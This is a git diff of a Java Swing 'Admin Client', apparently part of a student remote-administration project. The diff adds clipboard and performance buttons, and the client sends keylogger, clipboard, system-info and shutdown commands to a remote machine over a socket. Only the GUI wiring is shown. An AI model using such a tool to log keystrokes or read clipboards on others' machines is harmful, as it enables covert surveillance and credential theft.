@@ -12,22 +12,30 @@
     import java.io.PrintWriter;
     import java.net.Socket;
     import java.util.Base64;
+    import View.Admin.DisplayInfo;
+
+    
+    
+
 
     public class Admin extends JFrame {
         private JTextField ipTextField;
         private JButton connectButton;
+        private JButton performanceButton;
         private JButton runningProcessesButton;
         private JButton runningApplicationsButton;
         private JButton keyStrokeButton;
         private JButton shutDownButton;
         private JButton displayButton;
         private JButton printScreenshotButton;
+          private JButton clipboardButton;
         private JButton getInfoButton;
         private JButton exitButton;
         private JLabel errorLabel;
         private JTextArea chatArea;
         private JTextField chatInputField;
         private JButton sendChatButton;
+      
 
         private Socket socket;
         private PrintWriter out;
@@ -35,6 +43,8 @@
         private Thread responseReaderThread;
         private DisplayInfo displayInfo;
         private KeyloggerForm keyloggerForm;
+        private ClipboardForm clipboardForm;
+        private PerformanceForm performanceForm;
 
         public Admin() {
             setTitle("Admin Client");
@@ -53,6 +63,7 @@
 
             ipTextField = new JTextField();
             connectButton = new JButton("Connect");
+            performanceButton = new JButton("Performance");
             runningProcessesButton = new JButton("Running Processes");
             runningApplicationsButton = new JButton("Running Applications");
             keyStrokeButton = new JButton("KeyStroke");
@@ -61,11 +72,14 @@
             printScreenshotButton = new JButton("Print screenshot");
             getInfoButton = new JButton("Get info");
             exitButton = new JButton("Exit");
+            clipboardButton = new JButton("Clipboard");
+           
             errorLabel = new JLabel();
             errorLabel.setForeground(Color.RED);
 
             Dimension buttonSize = new Dimension(140, 30);
             connectButton.setPreferredSize(buttonSize);
+            performanceButton.setPreferredSize(buttonSize);
             runningProcessesButton.setPreferredSize(buttonSize);
             runningApplicationsButton.setPreferredSize(buttonSize);
             keyStrokeButton.setPreferredSize(buttonSize);
@@ -74,6 +88,7 @@
             printScreenshotButton.setPreferredSize(buttonSize);
             getInfoButton.setPreferredSize(buttonSize);
             exitButton.setPreferredSize(buttonSize);
+            clipboardButton.setPreferredSize(buttonSize);
 
             gbc.gridx = 0;
             gbc.gridy = 0;
@@ -89,6 +104,10 @@
             gbc.gridy = 1;
             gbc.gridwidth = 1;
             add(connectButton, gbc);
+            
+            gbc.gridx = 2;
+            gbc.gridy = 4; 
+            add(performanceButton, gbc);
 
             gbc.gridx = 0;
             gbc.gridy = 2;
@@ -146,6 +165,10 @@
             gbc.gridx = 2;
             gbc.gridy = 7;
             add(sendChatButton, gbc);
+            
+            gbc.gridx = 2;
+            gbc.gridy = 5;
+            add(clipboardButton, gbc);
         }
 
         private void addEventListeners() {
@@ -156,27 +179,26 @@
             });
 
             getInfoButton.addActionListener(e -> {
+                if (ensureConnected()) {   
+                        SwingUtilities.invokeLater(() -> {
+                            DisplayInfo displayInfo = new DisplayInfo(in, out);
+                            displayInfo.setVisible(true);
+                        });
+                        
+                    }
+            });
+            
+            performanceButton.addActionListener(e -> {
                 if (ensureConnected()) {
-                    sendCommand("OS_INFO");
-                    new Thread(() -> {
-                        try {
-                            String serverResponse;
-                            while ((serverResponse = in.readLine()) != null) {
-                                if (serverResponse.startsWith("OS_INFO:")) {
-                                    final String osinfo = serverResponse.substring("OS_INFO:".length());
-                                    SwingUtilities.invokeLater(() -> {
-                                        DisplayInfo displayInfo = new DisplayInfo(osinfo);
-                                        displayInfo.setVisible(true);
-                                    });
-                                    break;
-                                }
-                            }
-                        } catch (IOException ex) {
-                            ex.printStackTrace();
-                        }
-                    }).start();
+                    sendCommand("PERFORMANCE");
+                SwingUtilities.invokeLater(() -> {
+                    performanceForm = new PerformanceForm(out, in);
+                    performanceForm.setVisible(true);
+                });
                 }
             });
+
+
 
        runningApplicationsButton.addActionListener(e -> {
     
@@ -194,36 +216,25 @@
 
 
 
-    keyStrokeButton.addActionListener(e -> {
-        if (ensureConnected()) {
-            sendCommand("STARTKEYLOGGER");
-            // Initialize the form first
-            SwingUtilities.invokeLater(() -> {
-                KeyloggerForm keyloggerForm = new KeyloggerForm();
-                keyloggerForm.setVisible(true);
-            });
+     keyStrokeButton.addActionListener(e -> {
+            if (ensureConnected()) {
+                sendCommand("STARTKEYLOGGER");
+                SwingUtilities.invokeLater(() -> {
+                    keyloggerForm = new KeyloggerForm(out, in);
+                    keyloggerForm.setVisible(true);
+                });
+            }
 
-            // Start a thread to update the form with data
-            new Thread(() -> {
-                try {
-                    String serverResponse;
-                    while ((serverResponse = in.readLine()) != null) {
-                        if (serverResponse.startsWith("KEYLOG:")) {
-                            final String base64KeylogData = serverResponse.substring("KEYLOG:".length());
-                            SwingUtilities.invokeLater(() -> {
-                                KeyloggerForm keyloggerForm = KeyloggerForm.getCurrentInstance();
-                                if (keyloggerForm != null) {
-                                    keyloggerForm.updateKeylogData(base64KeylogData); // Truyền base64KeylogData vào updateKeylogData
-                                }
-                            });
-                        }
-                    }
-                } catch (IOException ex) {
-                    ex.printStackTrace();
-                }
-            }).start();
-        }
-    });
+        });
+      clipboardButton.addActionListener(e -> {
+                if (ensureConnected()) {
+                    sendCommand("CLIPBOARD");
+                    SwingUtilities.invokeLater(() -> {
+                    clipboardForm = new ClipboardForm(out, in);
+                    clipboardForm.setVisible(true);
+                });
+                }        
+            });
 
             shutDownButton.addActionListener(e -> {
                 if (ensureConnected()) {
@@ -299,6 +310,8 @@
                     }).start();
                 }
             });
+           
+    
 
             exitButton.addActionListener(e -> {
                 sendCommand("exit");
